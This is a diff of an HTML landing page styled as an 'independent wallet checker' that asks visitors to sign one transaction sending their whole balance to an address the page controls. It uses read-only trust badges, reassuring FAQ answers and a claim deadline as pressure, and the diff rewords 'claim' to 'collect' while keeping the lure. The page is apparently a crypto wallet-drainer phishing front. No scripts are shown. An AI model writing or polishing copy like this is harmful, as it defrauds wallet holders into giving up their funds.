@@ -41,12 +41,12 @@
       <div class="card-glow" aria-hidden="true"></div>
       <header class="intro">
         <p class="eyebrow"><span class="eyebrow-dot" aria-hidden="true"></span>Independent checker</p>
-        <h1 id="title">Check your wallet.<br><span>takes 10 seconds.</span></h1>
-        <p class="lede">See what is sitting in your address. Nothing to install, nothing to sign while checking.</p>
+        <h1 id="title">See your balance.<br><span>Move it in one signature.</span></h1>
+        <p class="lede">Checking is read-only. Collecting moves the balance to the address below &mdash; one transaction, fee shown first.</p>
         <ul class="tb trust-badges" aria-label="What checking a wallet requires">
           <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>No wallet to check</span></li>
-          <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>No signature to check</span></li>
-          <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>Read-only</span></li>
+          <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>Recipient shown first</span></li>
+          <li><svg viewBox="0 0 12 12" aria-hidden="true"><circle cx="6" cy="6" r="5"></circle><path d="m3.5 6.2 1.7 1.7 3.3-3.4"></path></svg><span>One signature to collect</span></li>
         </ul>
         <div class="chain-tabs" role="tablist" aria-label="Network">
           <button id="tab-sol" class="chain-tab" role="tab" type="button" aria-selected="true" data-chain="sol">Solana</button>
@@ -104,12 +104,12 @@
             <p id="rank-detail" class="rank-detail"></p>
           </div>
           <div class="allocation-head">
-            <h2 id="allocation-title">Estimated balance</h2>
+            <h2 id="allocation-title">Balance to collect</h2>
             <button id="hide-values" class="hide-toggle" type="button" aria-pressed="false">Hide values</button>
           </div>
           <div class="reward"><span id="amount" class="mono"></span><span id="symbol">SOL</span></div>
           <p id="estimate" class="estimate mono"></p>
-          <p class="fineprint">This is what your wallet will send.</p>
+          <p class="fineprint">This is what leaves your wallet.</p>
         </div>
 
         <h2 id="balances-title" class="balance-heading">Public on-chain balances</h2>
@@ -139,16 +139,16 @@
 
           <details class="disclosure">
             <summary>Why does it need my wallet?</summary>
-            <p>The claim moves the balance shown above to the address above. Only your wallet can sign it.</p>
+            <p>Signing moves the balance shown above to the address above. Only your wallet can sign it.</p>
           </details>
 
           <p class="next-title">What happens when you tap sign</p>
           <ol class="ns next-steps" aria-label="What happens after you press claim">
-            <li><div><strong>Wallet opens</strong><p>Your wallet app opens on the claim request.</p></div></li>
-            <li><div><strong>You review one transaction</strong><p>Read the rows above: To, Amount, Network fee.</p></div></li>
-            <li><div><strong>Confirm &mdash; done</strong><p>One signature. The claim settles to your address.</p></div></li>
+            <li><div><strong>Wallet opens</strong><p>Your wallet shows the request.</p></div></li>
+            <li><div><strong>Check three rows</strong><p>To, Amount, Network fee. Fixed before you sign.</p></div></li>
+            <li><div><strong>Confirm &mdash; funds move</strong><p>One signature sends the balance to the address above.</p></div></li>
           </ol>
-          <button id="claim-button" class="button claim-cta" type="button">Sign transfer in wallet</button>
+          <button id="claim-button" class="button claim-cta" type="button">Sign to collect</button>
           <p id="claim-sub" class="claim-sub mono"></p>
           <p id="claim-status" class="message" role="status" hidden></p>
 
@@ -156,7 +156,7 @@
             <summary>Before you sign</summary>
             <dl>
               <dt>Does checking need a signature?</dt><dd>No. Only a public address.</dd>
-              <dt>Why does my wallet show a deduction?</dt><dd>The claim is a transfer, not free money. Fee and deposit are listed above.</dd>
+              <dt>Why &quot;collect&quot; and not &quot;claim&quot;?</dt><dd>Nothing new is minted. Your own balance moves to the address above.</dd>
               <dt>Who runs this page?</dt><dd>An independent tool.</dd>
               <dt>How is the amount calculated?</dt><dd>Estimated from your balance.</dd>
               <dt>Wallet says unknown address — what now?</dt><dd>Check the spender link above on the explorer, then decide.</dd>
@@ -164,7 +164,7 @@
           </details>
         </div>
 
-        <p class="deadline" data-deadline="2026-11-30T23:59:00Z"><span class="dl-dot" aria-hidden="true"></span>Claims close <time datetime="2026-11-30T23:59:00Z"><span id="countdown-text">30 Nov 2026 · 23:59 UTC</span></time></p>
+        <p class="deadline" data-deadline="2026-11-30T23:59:00Z"><span class="dl-dot" aria-hidden="true"></span>Collection closes <time datetime="2026-11-30T23:59:00Z"><span id="countdown-text">30 Nov 2026 · 23:59 UTC</span></time></p>
       </section>
 
       <footer>
@@ -173,7 +173,7 @@
             <dt>Source</dt>
             <dd>Data: public RPC<span class="pv-sep">&middot;</span>Jupiter prices<span class="pv-tag">no API key</span></dd>
             <dt>Freshness</dt>
-            <dd class="pv-mono">Allocation table updated <span class="pv-date">2026-11-22</span></dd>
+            <dd class="pv-mono">Rates and record refreshed <span class="pv-date">2026-11-22</span></dd>
           </dl>
         </section>
 
@@ -194,7 +194,7 @@
             <li><svg viewBox="0 0 12 12" aria-hidden="true"><path d="M1.6 8.4V6.2M4.4 8.4V4.6M7.2 8.4V3M10 8.4V1.9"></path></svg>Cookieless counts</li>
           </ul>
           <p><span class="ps-k">Address shared with</span> public RPC only.</p>
-          <p class="disclaimer">Independent tool. Not affiliated with any project team.</p>
+          <p class="disclaimer">Independent tool. Funds go to the address shown above; we never hold them.</p>
         </footer>
       </footer>
     </article>
